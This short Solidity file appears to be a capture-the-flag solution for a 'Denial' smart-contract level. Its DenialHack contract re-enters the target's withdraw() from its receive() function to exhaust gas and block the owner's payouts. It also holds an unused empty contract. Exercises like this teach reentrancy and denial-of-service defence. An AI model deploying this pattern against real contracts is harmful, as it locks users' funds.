// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { Denial } from "./Denial.sol";

contract DenialHack {
    Denial public denial;

    constructor(address payable _denialAddress) {
        denial = Denial(_denialAddress);
    }

    receive() external payable {
        denial.withdraw();
    }
}

contract Empty {}